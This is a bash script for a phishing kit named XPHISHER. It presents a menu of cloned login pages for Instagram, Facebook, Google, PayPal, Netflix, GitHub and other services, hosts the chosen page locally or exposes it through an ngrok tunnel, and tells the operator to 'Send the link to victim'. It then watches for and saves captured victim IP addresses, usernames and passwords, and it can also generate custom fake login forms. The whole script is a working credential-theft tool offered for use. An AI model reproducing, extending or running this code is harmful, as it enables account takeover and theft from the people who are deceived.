#!/bin/bash
trap 'printf "\n";stop;exit 1' 2

banner(){
clear

echo -e "\e[93m __   __  _____    _    _   _____    _____   _    _   ______   _____  "
echo -e "\e[93m \ \ / / |  __ \  | |  | | |_   _|  / ____| | |  | | |  ____| |  __ \ "
echo -e "\e[93m  \ V /  | |__) | | |__| |   | |   | (___   | |__| | | |__    | |__) |"
echo -e "\e[93m   > <   |  ___/  |  __  |   | |    \___ \  |  __  | |  __|   |  _  / "
echo -e "\e[93m  / . \  | |      | |  | |  _| |_   ____) | | |  | | | |____  | | \ \ "
echo -e "\e[93m /_/ \_\ |_|      |_|  |_| |_____| |_____/  |_|  |_| |______| |_|  \_\ "

#####################################################
printf "\n"
printf "\n"
}
menu() {
printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m Instagram    \e\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Facebook    \e\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m Google      \e\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;92m Snapchat    \e\n"
printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;92m Microsoft   \e\n"
printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;92m Linkedin    \e\n"
printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;92m Netflix     \e\n"
printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;92m Github      \e\n"
printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;92m Wordpress   \e\n"    
printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;92m Twitter     \e\n"
printf " \e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;92m Playstation \e\n"  
printf " \e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;92m PayPal	 \e\n"
printf " \e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;92m Clear Cache \e\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;89m Option: \e[0m\e[1;96m\en' option
if [[ $option == 1 ]]; then
instagram               
elif [[ $option == 2 ]]; then
facebook
start
elif [[ $option == 3 ]]; then
google
elif [[ $option == 4 ]]; then
server="snapchat"
start
elif [[ $option == 5 ]]; then
server="microsoft"
start
elif [[ $option == 6 ]]; then
server="linkedin"
start
elif [[ $option == 7 ]]; then
server="netflix"
start
elif [[ $option == 8 ]]; then
server="github"
start
elif [[ $option == 9 ]]; then
server="wordpress"
start
elif [[ $option == 10 ]]; then
server="twitter"
start
elif [[ $option == 11 ]]; then
server="playstation"
start
elif [[ $option == 12 ]]; then
server="paypal"
start 
elif [[ $option == 13 ]]; then
clean                                                                                                                                                                                                                                                                                
elif [[ $option == X || $option == x ]]; then
clear
exit 1
else
printf "\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;33m 𝕀𝕟𝕧𝕒𝕝𝕚𝕕 𝕆𝕡𝕥𝕚𝕠𝕟 \e[0m\n"
sleep 0.3
banner
menu
fi
}
facebook(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="facebook"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="fb_advanced"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="fb_security"
start
elif [[ $option == 4 || $option == 04 ]]; then
server="fb_messenger"
start
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 0.3
banner
menu
fi
}



instagram(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="ig_followers"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="ig_verify"
start
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 0.3
banner
menu
fi
}
google(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Google Old Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Google New Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="google"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="google_new"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="google_poll"
start
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 0.3
banner
menu
fi
}
custom(){
                                                                                                                                                                        
server="custom"
createpage
start
}
clean() {
clear
rm -rf sites/fb_advanced/victim_ip.txt
rm -rf sites/fb_messanger/victim_ip.txt
rm -rf sites/fb_security/victim_ip.txt
rm -rf sites/github/victim_ip.txt
rm -rf sites/google/victim_ip.txt
rm -rf sites/google_new/victim_ip.txt
rm -rf sites/google_poll/victim_ip.txt
rm -rf sites/ig_followers/victim_ip.txt
rm -rf sites/ig_verify/victim_ip.txt
rm -rf sites/instagram/victim_ip.txt
rm -rf sites/linkedin/victim_ip.txt
rm -rf sites/microsoft/victim_ip.txt
rm -rf sites/netflix/victim_ip.txt
rm -rf sites/paypal/victim_ip.txt
rm -rf sites/playstation/victim_ip.txt
rm -rf sites/snapchat/victim_ip.txt
rm -rf sites/twitter/victim_ip.txt
rm -rf sites/wordpress/victim_ip.txt
rm -rf sites/fb_advanced/login_info.txt
rm -rf sites/fb_messanger/login_info.txt
rm -rf sites/fb_security/login_info.txt
rm -rf sites/github/login_info.txt
rm -rf sites/google/login_info.txt
rm -rf sites/google_new/login_info.txt
rm -rf sites/google_poll/login_info.txt
rm -rf sites/ig_followers/login_info.txt
rm -rf sites/ig_verify/login_info.txt
rm -rf sites/instagram/login_info.txt
rm -rf sites/linkedin/login_info.txt
rm -rf sites/microsoft/login_info.txt
rm -rf sites/netflix/login_info.txt
rm -rf sites/paypal/login_info.txt
rm -rf sites/playstation/login_info.txt
rm -rf sites/snapchat/login_info.txt
rm -rf sites/twitter/login_info.txt
rm -rf sites/wordpress/login_info.txt
figlet Completed
sleep 0.3
clear
}
stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e linksender ]]; then
rm -rf linksender
fi
}
start() {
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m LocalHost\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m Ngrok.io\e[0m\n"

d_o_server="2"
printf "\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;89m Select a Port Forwarding option: \e[0m\e[1;96m\en' option_server
option_server="${option_server:-${d_o_server}}"
if [[ $option_server == 2 || $option_server == 02 ]]; then
start_n
elif [[ $option_server == 1 || $option_server == 01 ]]; then
start_l
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
start
fi
}
start_s() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
start_serveo
}
createpage() {
default_cap1="Title of Webpage"
default_cap2="Login Page"
default_user_text="Username:"                                                                                                                                                                                                                                    
default_pass_text="Password"
default_sub_text="Login/Submit"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Main title of Webpage): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Second Title): \e[0m' cap2
cap2="${cap2:-${default_cap2}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
user_text="${user_text:-${default_user_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
pass_text="${pass_text:-${default_pass_text}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default button:Log-In): \e[0m' sub_text
sub_text="${sub_text:-${default_sub_text}}"

echo "<!DOCTYPE html>" > websites/custom/login.html
echo "<html>" >> websites/custom/login.html
echo "<body bgcolor=\"black\" text=\"white\">" >> websites/custom/login.html
IFS=$'\n'
printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> websites/custom/login.html
IFS=$'\n'
printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> websites/custom/login.html
IFS=$'\n'
printf '<input type="text" name="username" length=64>\n' >> websites/custom/login.html
IFS=$'\n'
printf '<br><label>%s: </label>' $pass_text >> websites/custom/login.html
IFS=$'\n'
printf '<input type="password" name="password" length=64><br><br>\n' >> sites/custom/login.html
IFS=$'\n'
printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/custom/login.html
printf '</center>' >> sites/custom/login.html
printf '<body>\n' >> sites/custom/login.html
printf '</html>\n' >> sites/custom/login.html


}


start_n() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt
fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt
fi
if [[ -e ngrok ]]; then
echo ""
else
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:5555\e[0m\e[1;92m)\e[0m\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
else
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
exit 1
fi
fi
fi
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
./ngrok http 5555 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
found
}


start_l() {
def_port="5555"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
printf "\n"
found
}
found() {
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do
if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
printf "\n"
c_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.75
if [[ -e "sites/$server/usernames.txt" ]]; then
printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\n"
printf "\n"
c_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.75
done
}
c_ip() {
touch sites/$server/login_info.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/victim_ip.txt\e[0m\n" $server
printf "\n"
cat sites/$server/ip.txt >> sites/$server/victim_ip.txt
}
c_cred() {
account=$(grep -o 'Username:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d " " -f2)
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Username:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/login_info.txt
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
}
banner

menu
